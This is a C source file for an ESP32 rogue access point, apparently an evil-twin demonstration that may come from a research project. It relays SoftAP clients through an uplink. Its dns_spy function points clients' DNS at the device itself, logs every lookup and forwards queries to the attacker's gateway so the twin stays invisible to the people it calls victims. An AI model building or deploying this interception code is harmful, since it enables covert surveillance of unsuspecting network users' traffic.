#include "napt_relay.h"
#include "dns_spy.h"
#include "esp_log.h"

static const char *TAG = "napt";

esp_err_t napt_relay_enable(esp_netif_t *ap_netif)
{
    esp_err_t e = esp_netif_napt_enable(ap_netif);
    if (e != ESP_OK) {
        ESP_LOGE(TAG, "NAPT enable failed: %s (check CONFIG_LWIP_IPV4_NAPT)",
                 esp_err_to_name(e));
    } else {
        ESP_LOGI(TAG, "NAPT enabled: SoftAP clients now relayed through the uplink");
    }
    return e;
}

void napt_relay_set_ap_dns_from_sta(esp_netif_t *ap_netif, esp_netif_t *sta_netif)
{
    esp_netif_dns_info_t dns;
    if (esp_netif_get_dns_info(sta_netif, ESP_NETIF_DNS_MAIN, &dns) != ESP_OK) {
        ESP_LOGW(TAG, "could not read uplink DNS");
        return;
    }
    // Hand the uplink's DNS to the AP's DHCP server so clients can resolve names.
    esp_netif_dhcps_stop(ap_netif);
    esp_netif_set_dns_info(ap_netif, ESP_NETIF_DNS_MAIN, &dns);
    uint8_t offer_dns = 0x02;  // DHCP offer: advertise a DNS server
    esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET,
                           ESP_NETIF_DOMAIN_NAME_SERVER, &offer_dns, sizeof(offer_dns));
    esp_netif_dhcps_start(ap_netif);
    ESP_LOGI(TAG, "AP DHCP now advertises uplink DNS " IPSTR, IP2STR(&dns.ip.u_addr.ip4));
}

void napt_relay_enable_dns_spy(esp_netif_t *ap_netif, esp_netif_t *sta_netif)
{
    // Forward victim lookups to the uplink GATEWAY (the attacker's own gateway, our
    // laptop at x.x.x.1). Public resolvers are unreachable here: Windows ICS blocks
    // clients' outbound DNS and the phone hotspot blocks port 53, so the only
    // resolver a victim-behind-the-twin can reach is one the gateway itself runs
    // (gateway/dns_helper.py, bound on the gateway IP). Keeping the victim resolving
    // normally is what makes the twin invisible (H2).
    esp_netif_ip_info_t staip;
    if (esp_netif_get_ip_info(sta_netif, &staip) != ESP_OK || staip.gw.addr == 0) {
        ESP_LOGW(TAG, "no uplink gateway yet; DNS spy not started");
        return;
    }
    uint32_t upstream = staip.gw.addr;  // the gateway's resolver (network byte order)

    // advertise the AP's OWN IP (192.168.4.1) as the DNS server, so every lookup
    // comes to us first
    esp_netif_ip_info_t apip;
    esp_netif_get_ip_info(ap_netif, &apip);
    esp_netif_dns_info_t self = { 0 };
    self.ip.type = ESP_IPADDR_TYPE_V4;
    self.ip.u_addr.ip4.addr = apip.ip.addr;

    esp_netif_dhcps_stop(ap_netif);
    esp_netif_set_dns_info(ap_netif, ESP_NETIF_DNS_MAIN, &self);
    uint8_t offer_dns = 0x02;
    esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET,
                           ESP_NETIF_DOMAIN_NAME_SERVER, &offer_dns, sizeof(offer_dns));
    esp_netif_dhcps_start(ap_netif);

    dns_spy_start(upstream);
    ESP_LOGW(TAG, "DANGER DEMO: clients now resolve through us; logging every lookup");
}
